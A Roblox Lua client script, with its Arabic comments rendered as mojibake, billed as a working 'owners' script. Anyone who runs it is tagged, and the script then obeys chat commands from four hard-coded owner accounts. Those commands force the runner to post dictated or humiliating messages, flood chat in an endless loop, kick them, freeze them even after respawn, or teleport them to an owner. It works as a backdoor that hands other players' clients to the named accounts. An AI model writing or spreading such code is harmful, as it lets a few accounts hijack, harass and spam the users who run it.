--// Ø³ÙƒØ±Ø¨Øª Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª Ø§Ù„Ù†Ù‡Ø§Ø¦Ø¯ - Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ 100% Ø´ØºØ§Ù„ (ÙƒÙ„ Ø§Ù„Ø£ÙˆØ§Ù…Ø± ØªØ¹Ù…Ù„ + Ø£Ù†Øª Ù…Ø­ØµÙ† ØªÙ…Ø§Ù…Ù‹Ø§)
local Players = game:GetService("Players")
local player = Players.LocalPlayer

player:SetAttribute("ScriptUser", true)

local Owners = {["1il5i"]=true, ["eyad51533"]=true, ["awr_9351156"]=true, ["sj3zx"]=true}

local ChattedEvent = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("ChattedEvent")
local SendMessage   = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("SendMessage")

-- Ø¨Ø­Ø« Ø¹Ù† Ù„Ø§Ø¹Ø¨ (ÙŠØ³ØªØ«Ù†ÙŠÙƒ Ø£Ù†Øª ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§)
local function findTarget(partial)
    if not partial or #partial < 2 then return nil end
    partial = partial:lower()
    for _, p in Players:GetPlayers() do
        if p ~= player and p:GetAttribute("ScriptUser") and 
           (p.Name:lower():find(partial) or p.DisplayName:lower():find(partial)) then
            return p
        end
    end
    return nil
end

-- Ø³Ø¨Ø§Ù…
local isSpamming = {}
local function startSpam(plr, text)
    if plr == player or isSpamming[plr] then return end
    isSpamming[plr] = true
    spawn(function()
        while isSpamming[plr] do
            SendMessage:FireServer(text)
            task.wait()
        end
    end)
end
local function stopSpam(plr)
    isSpamming[plr] = false
end

-- ØªØ¬Ù…ÙŠØ¯ Ø¯Ø§Ø¦Ù… Ø­ØªÙ‰ Ø¨Ø¹Ø¯ Ø§Ù„Ø±ÙŠØ³Øª
local function freeze(plr)
    if plr == player then return end
    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        local bv = Instance.new("BodyVelocity", plr.Character.HumanoidRootPart)
        bv.Velocity = Vector3.new(0,0,0)
        bv.MaxForce = Vector3.new(4000,4000,4000)
        bv.P = 9000
        bv.Name = "OwnerFreeze"
    end
    plr:SetAttribute("IsFrozen", true)

    plr.CharacterAdded:Connect(function(char)
        task.wait(1)
        if plr:GetAttribute("IsFrozen") and char:FindFirstChild("HumanoidRootPart") then
            local bv = Instance.new("BodyVelocity", char.HumanoidRootPart)
            bv.Velocity = Vector3.new(0,0,0)
            bv.MaxForce = Vector3.new(4000,4000,4000)
            bv.P = 9000
            bv.Name = "OwnerFreeze"
        end
    end)
end

local function unfreeze(plr)
    plr:SetAttribute("IsFrozen", false)
    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        local bv = plr.Character.HumanoidRootPart:FindFirstChild("OwnerFreeze")
        if bv then bv:Destroy() end
    end
end

ChattedEvent.OnClientEvent:Connect(function(senderPlayer, command)
    if not senderPlayer or not Owners[senderPlayer.Name] then return end
    if typeof(command) ~= "string" then return end

    local args = {}
    for word in command:gmatch("%S+") do table.insert(args, word) end
    local cmd = args[1] and args[1]:lower() or ""
    table.remove(args, 1)

    ----------------------------------------------------------------
    -- .say all/ÙŠÙˆØ²Ø± [ÙƒÙ„Ø§Ù…]
    if cmd == ".say" then
        if #args < 2 then return end
        local targetStr = args[1]
        table.remove(args, 1)
        local message = table.concat(args, " ")

        if targetStr:lower() == "all" then
            for _, p in Players:GetPlayers() do
                if p:GetAttribute("ScriptUser") and p ~= player then
                    SendMessage:FireServer(message)
                end
            end
        else
            local target = findTarget(targetStr)
            if target then SendMessage:FireServer(message) end
        end
        return
    end

    ----------------------------------------------------------------
    local lower = command:lower()

    if lower == ".3mk all" then
        SendMessage:FireServer("Ø¹Ù…Ù‹Ù‰Ø§Ù†ÙÙŠÙ‹ Ø§ÙˆÙ†Ù‹Ø±Ø§ØªÙ‹ Ø³ÙƒÙ‹Ù‰Ø±Ù‹Ø¨ØªÙ‹ Ø²Ø­ÙÙÙÙÙ ðŸ¥º")

    elseif lower:sub(1,5) == ".3mk " then
        local target = findTarget(command:sub(6))
        if target then
            if player == target then
                SendMessage:FireServer(".3mk " .. target.DisplayName)
            end
            SendMessage:FireServer("Ø¹Ù…Ù‹Ù‰Ø§Ù†ÙÙŠÙ‹ Ø§ÙˆÙ†Ù‹Ø±Ø§ØªÙ‹ Ø³ÙƒÙ‹Ù‰Ø±Ù‹Ø¨ØªÙ‹ Ø²Ø­ÙÙÙÙÙ ðŸ¥º")
        end

    elseif lower == ".f7lk" or lower == ".f7lk all" or lower:sub(1,6) == ".f7lk " then
        SendMessage:FireServer("ÙØ­Ù‹Ù‰Ù‹Ù„Ù‹ÙŠ @"..senderPlayer.DisplayName.." ðŸ¥º")

    elseif lower:sub(1,6) == ".spam " then
        local targetStr = args[1]
        table.remove(args, 1)
        local text = table.concat(args, " ")
        if text == "" then text = "Ø§Ù†Ø§ Ø²Ø­Ù ÙˆØ§Ø¹ØªØ±Ù Ø¨Ù…Ù„ÙƒÙŠØ© Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª ðŸ¥º" end

        if targetStr:lower() == "all" then
            for _, p in Players:GetPlayers() do
                if p:GetAttribute("ScriptUser") and p ~= player then startSpam(p, text) end
            end
        else
            local target = findTarget(targetStr)
            if target then startSpam(target, text) end
        end

    elseif lower:sub(1,8) == ".unspam " then
        local targetStr = command:sub(9):match("^%s*(.-)%s*$")
        if targetStr:lower() == "all" then
            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") then stopSpam(p) end end
        else
            local target = findTarget(targetStr)
            if target then stopSpam(target) end
        end

    elseif lower:sub(1,6) == ".kick " then
        local targetStr = args[1]
        table.remove(args, 1)
        local reason = table.concat(args, " ")
        if reason == "" then reason = "ØªÙ… Ø·Ø±Ø¯Ùƒ Ø¨ÙˆØ§Ø³Ø·Ø© Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª" end

        if targetStr:lower() == "all" then
            for _, p in Players:GetPlayers() do
                if p:GetAttribute("ScriptUser") and p ~= player then p:Kick(reason) end
            end
        else
            local target = findTarget(targetStr)
            if target then target:Kick(reason) end
        end

    elseif lower:sub(1,7) == ".bring " then
        local targetStr = command:sub(8):match("^%s*(.-)%s*$")
        if targetStr:lower() == "all" then
            for _, p in Players:GetPlayers() do
                if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p:GetAttribute("ScriptUser") then
                    p.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
                end
            end
        else
            local target = findTarget(targetStr)
            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                target.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
            end
        end

    elseif lower:sub(1,8) == ".freeze " then
        local targetStr = command:sub(9):match("^%s*(.-)%s*$")
        if targetStr:lower() == "all" then
            for _, p in Players:GetPlayers() do if p ~= player and p:GetAttribute("ScriptUser") then freeze(p) end end
        else
            local target = findTarget(targetStr)
            if target then freeze(target) end
        end

    elseif lower:sub(1,10) == ".unfreeze " then
        local targetStr = command:sub(11):match("^%s*(.-)%s*$")
        if targetStr:lower() == "all" then
            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") then unfreeze(p) end end
        else
            local target = findTarget(targetStr)
            if target then unfreeze(target) end
        end
    end
end)

print("Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ Ø´ØºØ§Ù„ 100% - ÙƒÙ„ Ø§Ù„Ø£ÙˆØ§Ù…Ø± ØªØ¹Ù…Ù„ + Ø£Ù†Øª Ù…Ø­ØµÙ† ØªÙ…Ø§Ù…Ù‹Ø§")
